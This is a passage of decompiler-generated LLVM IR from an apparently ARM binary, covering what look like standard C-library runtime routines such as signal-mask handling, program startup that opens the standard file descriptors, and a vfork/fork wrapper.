  store i32 %v2_10b6c, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v2_10be8 = call i32 @function_136e0(i32 %v2_10b6c, i32 17)
  store i32 %v2_10be8, i32* %r0.global-to-local, align 4
  %v1_10bec = icmp slt i32 %v2_10be8, 0
  br i1 %v1_10bec, label %dec_label_pc_10cd0, label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10be0
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_10c00 = call i32 @function_11038(i32 17, i32* null, i32 %v2_10b44)
  store i32 %v4_10c00, i32* %r0.global-to-local, align 4
  %v1_10c04 = icmp slt i32 %v4_10c00, 0
  br i1 %v1_10c04, label %dec_label_pc_10c0c, label %dec_label_pc_10c34

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10bf4
  %v0_10c0c = call i32 @function_cec4()
  store i32 %v2_10b90, i32* %r1.global-to-local, align 4
  store i32 %v0_10c0c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10c20 = inttoptr i32 %v0_10c0c to i32*
  %v2_10c20 = load i32, i32* %v1_10c20, align 4
  store i32 %v2_10c20, i32* @r4, align 4
  %v3_10c24 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_10c24 = call i32 @function_11494(i32 2, %_TYPEDEF_sigset_t* %v3_10c24, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10c2c = load i32, i32* @r4, align 4
  %v1_10c2c = load i32, i32* %r5.global-to-local, align 4
  %v2_10c2c = inttoptr i32 %v1_10c2c to i32*
  store i32 %v0_10c2c, i32* %v2_10c2c, align 4
  %v17_10cd8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10c34:                               ; preds = %dec_label_pc_10bf4
  %v2_10c34 = load i32, i32* %stack_var_-424, align 4
  %v7_10c38 = icmp eq i32 %v2_10c34, 1
  %v2_10c40 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_10c40, i32* @r4, align 4
  br i1 %v7_10c38, label %dec_label_pc_10c48, label %dec_label_pc_10c7c

dec_label_pc_10c48:                               ; preds = %dec_label_pc_10c34
  store i32 %v2_10c40, i32* %r1.global-to-local, align 4
  store i32 %v2_10c40, i32* %r0.global-to-local, align 4
  %v2_10c50 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_10c50 = call i32 @function_11378(%timespec* %v2_10c50, i32 %v2_10c40)
  store i32 %v3_10c50, i32* %r0.global-to-local, align 4
  store i32 %v3_10c50, i32* %r6.global-to-local, align 4
  %v0_10c58 = call i32 @function_cec4()
  store i32 %v2_10b90, i32* %r1.global-to-local, align 4
  store i32 %v0_10c58, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10c6c = inttoptr i32 %v0_10c58 to i32*
  %v2_10c6c = load i32, i32* %v1_10c6c, align 4
  store i32 %v2_10c6c, i32* @r4, align 4
  %v3_10c70 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_10c70 = call i32 @function_11494(i32 2, %_TYPEDEF_sigset_t* %v3_10c70, i32 0)
  store i32 %v4_10c70, i32* %r0.global-to-local, align 4
  %v0_10c74 = load i32, i32* @r4, align 4
  %v1_10c74 = load i32, i32* %r5.global-to-local, align 4
  %v2_10c74 = inttoptr i32 %v1_10c74 to i32*
  store i32 %v0_10c74, i32* %v2_10c74, align 4
  %v0_10ca4.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10ca4

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10c34
  store i32 %v2_10b90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_10c88 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_10c88 = call i32 @function_11494(i32 2, %_TYPEDEF_sigset_t* %v3_10c88, i32 0)
  store i32 %v4_10c88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10bac.dec_label_pc_10c98_crit_edge, %dec_label_pc_10c7c
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_10bac.dec_label_pc_10c98_crit_edge ], [ %v2_10c40, %dec_label_pc_10c7c ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_10c9c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_10c9c = call i32 @function_11378(%timespec* %v2_10c9c, i32 %storemerge.pre-phi)
  store i32 %v3_10c9c, i32* %r0.global-to-local, align 4
  store i32 %v3_10c9c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c48, %dec_label_pc_10c98
  %v0_10ca4 = phi i32 [ %v0_10ca4.pr, %dec_label_pc_10c48 ], [ %v3_10c9c, %dec_label_pc_10c98 ]
  %v2_10ca4 = icmp eq i32 %v0_10ca4, 0
  br i1 %v2_10ca4, label %dec_label_pc_10cc8, label %dec_label_pc_10cac

dec_label_pc_10cac:                               ; preds = %dec_label_pc_10ca4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_10cb4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_10cb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10cc8:                               ; preds = %dec_label_pc_10b3c, %dec_label_pc_10ca4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10cd0:                               ; preds = %dec_label_pc_10b90, %dec_label_pc_10be0, %dec_label_pc_10b6c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10cac, %dec_label_pc_10cc8, %dec_label_pc_10c0c, %dec_label_pc_10cd0
  %v17_10cd8 = phi i32 [ %v3_10cb4, %dec_label_pc_10cac ], [ 0, %dec_label_pc_10cc8 ], [ %v17_10cd8.pre, %dec_label_pc_10c0c ], [ -1, %dec_label_pc_10cd0 ]
  %v2_10cd8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10cd8, i32* @r4, align 4
  store i32 %v6_10b3c, i32* @r5, align 4
  store i32 %v9_10b3c, i32* @r6, align 4
  ret i32 %v17_10cd8

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_10c40, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_10bd0, { 0, 2, 1 }
  uselistorder i32 %v2_10b90, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_10b88, { 1, 0, 2 }
  uselistorder i32 %v2_10b6c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_10b5c, { 0, 2, 1 }
  uselistorder i32 %v16_10b3c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 16, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 24, 10, 12, 13, 11, 15, 14, 17, 16, 23, 18, 22, 19, 21, 20, 0 }
  uselistorder i32 (i32, i32)* @function_136e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10cd4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10cd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10cc8, { 1, 0 }
  uselistorder label %dec_label_pc_10ca4, { 1, 0 }
  uselistorder label %dec_label_pc_10c98, { 1, 0 }
  uselistorder label %dec_label_pc_10bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10b54, { 1, 0 }
}

define i32 @function_10ce0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10d0c:
  %stack_var_-8 = alloca i32, align 4
  %v3_10ce0 = load i32, i32* @r4, align 4
  store i32 %v3_10ce0, i32* %stack_var_-8, align 4
  %v2_10d10 = load i32, i32* @global_var_1aabc.508, align 4
  %v2_10d14 = icmp eq i32 %v2_10d10, 0
  br i1 %v2_10d14, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_10d0c
  call void @__pseudo_branch(i32 %v2_10d10)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10d0c, %bb
  %v2_10d24 = load i32, i32* @global_var_1aac0.510, align 4
  %v2_10d28 = icmp eq i32 %v2_10d24, 0
  br i1 %v2_10d28, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_10d2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_10d2c, i32* @r4, align 4
  %v9_10d2c = load i32, i32* @r0, align 4
  ret i32 %v9_10d2c

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_10d24)
  %v2_10d38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10d38, i32* @r4, align 4
  %v8_10d38 = load i32, i32* @r0, align 4
  ret i32 %v8_10d38

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_10d4c() local_unnamed_addr {
dec_label_pc_10d4c:
  ret i32 0
}

define i32 @function_10d54() local_unnamed_addr {
dec_label_pc_10d54:
  %v1_10d54 = load i32, i32* @r0, align 4
  ret i32 %v1_10d54
}

define i32 @function_10d58(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10d58:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10d58 = load i32, i32* @r4, align 4
  store i32 %v3_10d58, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_10d68 = call i32 @function_11158(i32 %arg1, i32 1)
  %v7_10d6c = icmp eq i32 %v2_10d68, -1
  br i1 %v7_10d6c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_10d58
  %v3_10d70 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_10d70, i32* @r4, align 4
  ret i32 %v2_10d68

bb4:                                              ; preds = %dec_label_pc_10d58
  %v0_10d74 = load i32, i32* @r4, align 4
  %v4_10d7c = call i32 @function_113a4(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_16e88.513, i32 0, i32 0), i32 %v0_10d74)
  %v1_10d80 = load i32, i32* %r5.global-to-local, align 4
  %v9_10d80 = icmp eq i32 %v4_10d7c, %v1_10d80
  br i1 %v9_10d80, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_10d84 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_10d84, i32* @r4, align 4
  ret i32 %v4_10d7c

bb6:                                              ; preds = %bb4
  %v0_10d88 = call i32 @function_1021c()
  %v0_10d8c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10d8c, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v2_10d8c = load i32, i32* @r8, align 4
  %v5_10d8c = mul i32 %v2_10d8c, 536870912
  %v6_10d8c = and i32 %v5_10d8c, %v0_10d74
  store i32 %v6_10d8c, i32* @r6, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_10d88

; uselistorder directives
  uselistorder i32 %v2_10d68, { 1, 0 }
  uselistorder i32 ()* @function_1021c, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_10d90(i32 %arg1) local_unnamed_addr {
dec_label_pc_10d90:
  %v2_10d94 = load i32, i32* @global_var_1aac4.515, align 4
  %v2_10d98 = icmp eq i32 %v2_10d94, 0
  br i1 %v2_10d98, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_10d90
  %v6_10da4 = load i32, i32* @r0, align 4
  ret i32 %v6_10da4

bb3:                                              ; preds = %dec_label_pc_10d90
  store i32 1, i32* @global_var_1aac4.515, align 4
  store i32 4096, i32* @global_var_1aab8.274, align 4
  %v0_10dd8 = call i32 @function_d790()
  ret i32 %v0_10dd8
}

define i32 @function_10dec(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_10dec:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_10df0 = mul i32 %arg2, 4
  %v5_10df0 = add i32 %tmp, %v4_10df0
  %v2_10df4 = load i32, i32* %arg3, align 4
  %v2_10df8 = ptrtoint i32* %stack_var_-120 to i32
  %v1_10dfc = add i32 %v5_10df0, 4
  %v9_10e00 = icmp eq i32 %v1_10dfc, %v2_10df4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_1aab0.521, align 4
  store i32 %v1_10dfc, i32* @global_var_1aab4.502, align 4
  store i32 %arg6, i32* @global_var_1aac0.510, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_10e00, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_10dec
  store i32 %v5_10df0, i32* @global_var_1aab4.502, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_10dec, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_10e40 = bitcast i32* %stack_var_-120 to i8*
  %v3_10e40 = call i32 @function_ef70(i8* %v2_10e40, i32 0)
  %storemerge.pre = load i32, i32* @global_var_1aab4.502, align 4
  br label %dec_label_pc_10e50

dec_label_pc_10e50:                               ; preds = %dec_label_pc_10e50, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_10e50, %dec_label_pc_10e50 ]
  %v1_10e50 = inttoptr i32 %storemerge to i32*
  %v2_10e50 = load i32, i32* %v1_10e50, align 4
  %v4_10e50 = add i32 %storemerge, 4
  %v2_10e54 = icmp eq i32 %v2_10e50, 0
  br i1 %v2_10e54, label %dec_label_pc_10e60, label %dec_label_pc_10e50

dec_label_pc_10e60:                               ; preds = %dec_label_pc_10e50
  store i32 %v4_10e50, i32* @r4, align 4
  %v1_10e8022 = inttoptr i32 %v4_10e50 to i32*
  %v2_10e8023 = load i32, i32* %v1_10e8022, align 4
  %v2_10e8425 = icmp eq i32 %v2_10e8023, 0
  br i1 %v2_10e8425, label %dec_label_pc_10e8c, label %dec_label_pc_10e68

dec_label_pc_10e68:                               ; preds = %dec_label_pc_10e60, %dec_label_pc_10e80
  %v5_10e6c = phi i32 [ %v2_10e80, %dec_label_pc_10e80 ], [ %v2_10e8023, %dec_label_pc_10e60 ]
  %v2_10e68 = icmp ugt i32 %v5_10e6c, 13
  %v7_10e68 = icmp eq i32 %v5_10e6c, 14
  %v2_10e6c = xor i1 %v2_10e68, true
  %v3_10e6c = or i1 %v7_10e68, %v2_10e6c
  br i1 %v3_10e6c, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_10e68
  %v6_10e6c = and i32 %v5_10e6c, 536870912
  %v7_10e6c = icmp ne i32 %v6_10e6c, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_10e68, %bb42
  %v1_10e78 = phi i1 [ %v2_10e68, %dec_label_pc_10e68 ], [ %v7_10e6c, %bb42 ]
  %v2_10e70 = xor i1 %v1_10e78, true
  %v3_10e70 = or i1 %v7_10e68, %v2_10e70
  br i1 %v3_10e70, label %bb44, label %dec_label_pc_10e80

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_10e80

dec_label_pc_10e80:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_10e70, i32 ptrtoint (i32* @global_var_ef60.420 to i32))
  %v0_10e7c = load i32, i32* @r4, align 4
  %v1_10e7c = add i32 %v0_10e7c, 8
  store i32 %v1_10e7c, i32* @r4, align 4
  %v1_10e80 = inttoptr i32 %v1_10e7c to i32*
  %v2_10e80 = load i32, i32* %v1_10e80, align 4
  %v2_10e84 = icmp eq i32 %v2_10e80, 0
  br i1 %v2_10e84, label %dec_label_pc_10e8c, label %dec_label_pc_10e68

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10e80, %dec_label_pc_10e60
  %v1_10e90 = call i32 @function_13728(i32 %v2_10df8)
  store i32 %v1_10e90, i32* @r0, align 4
  %v1_10e94 = call i32 @function_10d90(i32 %v1_10e90)
  store i32 %v1_10e94, i32* @r0, align 4
  %v2_10ea0 = icmp eq i32 %tmp37, 0
  br i1 %v2_10ea0, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_10e8c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_10e8c, %bb45
  %v0_10eb0 = phi i32 [ %tmp37, %dec_label_pc_10e8c ], [ 4096, %bb45 ]
  %v3_10ea8 = icmp eq i32 %tmp36, -1
  %v8_10ea8 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_1aab8.274 to i32), i32* @r2, align 4
  store i32 %v0_10eb0, i32* @global_var_1aab8.274, align 4
  br i1 %v3_10ea8, label %dec_label_pc_10eb8, label %dec_label_pc_10ee0

dec_label_pc_10eb8:                               ; preds = %bb46
  %v0_10eb8 = call i32 @function_1134c()
  store i32 %v0_10eb8, i32* @r0, align 4
  store i32 %v0_10eb8, i32* @r4, align 4
  %v0_10ec0 = call i32 @function_112f4()
  %v0_10ec4 = load i32, i32* @r4, align 4
  %v9_10ec4 = icmp eq i32 %v0_10ec4, %v0_10ec0
  br i1 %v9_10ec4, label %dec_label_pc_10ecc, label %dec_label_pc_10f08

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10eb8
  %v1_10ecc = call i32 @function_11320(i32 %v0_10ec0)
  store i32 %v1_10ecc, i32* @r0, align 4
  store i32 %v1_10ecc, i32* @r4, align 4
  %v0_10ed4 = call i32 @function_112c8()
  %v0_10ed8 = load i32, i32* @r4, align 4
  %v9_10ed8 = icmp eq i32 %v0_10ed8, %v0_10ed4
  br i1 %v9_10ed8, label %dec_label_pc_10ee0, label %dec_label_pc_10f08

dec_label_pc_10ee0:                               ; preds = %dec_label_pc_10ecc, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_10ea8, label %dec_label_pc_10f74, label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %dec_label_pc_10ee0
  %v9_10ef0 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_10ef0, label %dec_label_pc_10ef8, label %dec_label_pc_10f08

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10eec
  br label %dec_label_pc_10f08

dec_label_pc_10f08:                               ; preds = %dec_label_pc_10ef8, %dec_label_pc_10eec, %dec_label_pc_10ecc, %dec_label_pc_10eb8
  %v2_10f10 = call i32 @function_10d58(i32 0, i32 32768)
  %v2_10f1c = call i32 @function_10d58(i32 1, i32 32770)
  %v2_10f28 = call i32 @function_10d58(i32 2, i32 32770)
  br label %dec_label_pc_10f74

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f08, %dec_label_pc_10ee0
  %v0_10f38 = load i32, i32* @r6, align 4
  %v1_10f38 = inttoptr i32 %v0_10f38 to i32*
  %v2_10f38 = load i32, i32* %v1_10f38, align 4
  store i32 %v2_10f38, i32* @global_var_18420, align 4
  store i32 %arg5, i32* @global_var_1aabc.508, align 4
  %v2_10f74 = icmp eq i32 %arg4, 0
  br i1 %v2_10f74, label %dec_label_pc_10fb0, label %bb47

bb47:                                             ; preds = %dec_label_pc_10f74
  br label %dec_label_pc_10fb0

dec_label_pc_10fb0:                               ; preds = %dec_label_pc_10f74, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_10fc0 = call i32 @function_cec4()
  %v2_10fc8 = inttoptr i32 %v1_10fc0 to i32*
  store i32 0, i32* %v2_10fc8, align 4
  %v1_10fdc = call i32 @function_11514()
  %v2_10fe4 = inttoptr i32 %v1_10fdc to i32*
  store i32 0, i32* %v2_10fe4, align 4
  %v0_10ff4 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_11000 = call i32 @function_10a14(i32 %v0_10ff4)
  ret i32 %v1_11000

; uselistorder directives
  uselistorder i32 %v2_10e80, { 1, 0 }
  uselistorder i32 %v1_10e7c, { 1, 0 }
  uselistorder i1 %v2_10e68, { 1, 0 }
  uselistorder i32 %v4_10e50, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @function_10a14, { 0, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_10d58, { 2, 1, 0 }
  uselistorder i32* @global_var_1aab8.274, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 4096, { 1, 2, 10, 5, 11, 3, 0, 9, 4, 6, 7, 8 }
  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10fb0, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_10e80, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_10e68, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_11038(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11038:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_11038 = load i32, i32* @r4, align 4
  %v6_11038 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1103c = icmp eq i32* %arg2, null
  %v2_11040 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_1103c, label %dec_label_pc_110ac, label %dec_label_pc_11050

dec_label_pc_11050:                               ; preds = %dec_label_pc_11038
  %v2_11054 = load i32, i32* %arg2, align 4
  %v4_11054 = add i32 %tmp, 4
  store i32 %v4_11054, i32* @r1, align 4
  %v2_11058 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_11058, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_11054, i32* %stack_var_-156, align 4
  %v0_11064 = call i32 @function_ef60()
  store i32 %v0_11064, i32* %r0.global-to-local, align 4
  %v0_11068 = load i32, i32* @r4, align 4
  %v1_11068 = add i32 %v0_11068, 132
  %v2_11068 = inttoptr i32 %v1_11068 to i32*
  %v3_11068 = load i32, i32* %v2_11068, align 4
  %v1_1106c = and i32 %v3_11068, 67108864
  %v2_1106c = icmp eq i32 %v1_1106c, 0
  br i1 %v2_1106c, label %dec_label_pc_11080, label %bb

bb:                                               ; preds = %dec_label_pc_11050
  br label %dec_label_pc_1109c

dec_label_pc_11080:                               ; preds = %dec_label_pc_11050
  %v1_11088 = and i32 %v3_11068, 4
  %v2_11088 = icmp eq i32 %v1_11088, 0
  br i1 %v2_11088, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_11080
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_11080, %bb20
  br label %dec_label_pc_1109c

dec_label_pc_1109c:                               ; preds = %bb, %bb21
  %v2_1109c = icmp eq i32 %v0_11068, 0
  %v3_110a0 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_110a0 = select i1 %v2_1109c, i32 0, i32 %v3_110a0
  %v0_110ac.pre = load i32, i32* @r5, align 4
  %v0_110bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_110ac

dec_label_pc_110ac:                               ; preds = %dec_label_pc_1109c, %dec_label_pc_11038
  %v0_110bc = phi i32 [ %arg1, %dec_label_pc_11038 ], [ %v0_110bc.pre, %dec_label_pc_1109c ]
  %v0_110ac = phi i32 [ %arg3, %dec_label_pc_11038 ], [ %v0_110ac.pre, %dec_label_pc_1109c ]
  %storemerge = phi i32 [ 0, %dec_label_pc_11038 ], [ %.v3_110a0, %dec_label_pc_1109c ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_110ac = icmp eq i32 %v0_110ac, 0
  %.v2_11040 = select i1 %v2_110ac, i32 0, i32 %v2_11040
  store i32 %.v2_11040, i32* @r2, align 4
  store i32 %v0_110bc, i32* %r0.global-to-local, align 4
  %v1_110c0 = call i32 @function_1121c(i32 %v0_110bc)
  store i32 %v1_110c0, i32* %r0.global-to-local, align 4
  %v0_110c4 = load i32, i32* @r5, align 4
  %v2_110c4 = icmp eq i32 %v0_110c4, 0
  br i1 %v2_110c4, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_110ac
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_110ac, %bb25
  %v0_110d4.pr = phi i32 [ 0, %dec_label_pc_110ac ], [ 1, %bb25 ]
  %v1_110cc = icmp slt i32 %v1_110c0, 0
  br i1 %v1_110cc, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_11108

thread-pre-split:                                 ; preds = %bb26
  %v2_110d4 = icmp eq i32 %v0_110d4.pr, 0
  store i32 %v1_110c0, i32* @r4, align 4
  br i1 %v2_110d4, label %dec_label_pc_11108, label %dec_label_pc_110e0

dec_label_pc_110e0:                               ; preds = %thread-pre-split
  %v2_110e0 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_110c4, i32* %r0.global-to-local, align 4
  %v2_110e8 = inttoptr i32 %v0_110c4 to i32*
  store i32 %v2_110e0, i32* %v2_110e8, align 4
  %v3_110e8 = load i32, i32* %r0.global-to-local, align 4
  %v4_110e8 = add i32 %v3_110e8, 4
  store i32 %v4_110e8, i32* @r0, align 4
  %v2_110ec = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_110ec, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_110f4 = call i32 @function_ef60()
  store i32 %v0_110f4, i32* %r0.global-to-local, align 4
  %v1_110fc = load i32, i32* @r5, align 4
  %v2_110fc = add i32 %v1_110fc, 136
  %v3_110fc = inttoptr i32 %v2_110fc to i32*
  %v1_11104 = load i32, i32* @r5, align 4
  %v2_11104 = add i32 %v1_11104, 132
  %v3_11104 = inttoptr i32 %v2_11104 to i32*
  %v0_11108.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11108

dec_label_pc_11108:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_110e0
  %v0_11108 = phi i32 [ %v1_110c0, %thread-pre-split ], [ %v0_11108.pre, %dec_label_pc_110e0 ], [ %v1_110c0, %thread-pre-split.thread ]
  store i32 %v0_11108, i32* %r0.global-to-local, align 4
  store i32 %v3_11038, i32* @r4, align 4
  store i32 %v6_11038, i32* @r5, align 4
  ret i32 %v0_11108

; uselistorder directives
  uselistorder i32 %v0_11108, { 1, 0 }
  uselistorder i32 %v0_110c4, { 1, 0, 2 }
  uselistorder i32 %v0_110bc, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 4, 5, 2, 7, 1, 0 }
  uselistorder label %dec_label_pc_11108, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_1109c, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_11120(i32 %arg1) local_unnamed_addr {
dec_label_pc_11120:
  %v0_11120 = call i32 @vfork()
  store i32 %v0_11120, i32* @r0, align 4
  %v2_11124 = icmp ugt i32 %v0_11120, -4097
  br i1 %v2_11124, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_11138, %dec_label_pc_11120
  %merge = phi i32 [ %v0_11120, %dec_label_pc_11120 ], [ %v0_11138, %dec_label_pc_11138 ]
  ret i32 %merge

bb1:                                              ; preds = %dec_label_pc_11120
  %v4_11130 = icmp eq i32 %v0_11120, -38
  br i1 %v4_11130, label %dec_label_pc_11138, label %bb2

dec_label_pc_11138:                               ; preds = %bb1
  %v0_11138 = call i32 @fork()
  store i32 %v0_11138, i32* @r0, align 4
  %v2_1113c = icmp ugt i32 %v0_11138, -4097
  br i1 %v2_1113c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_11138
  %v0_11144 = call i32 @function_13788()
  %v1_1114c = inttoptr i32 %v0_11144 to %sigcontext*
  %v3_11150 = call i32 @sigreturn(%sigcontext* %v1_1114c)
  %v4_11150 = inttoptr i32 %v3_11150 to %sigcontext*
  %v3_11154 = call i32 @sigreturn(%sigcontext* %v4_11150)
  ret i32 %v3_11154

; uselistorder directives
  uselistorder i32 %v0_11138, { 1, 2, 0 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder i32 -4097, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_11158(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11158:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
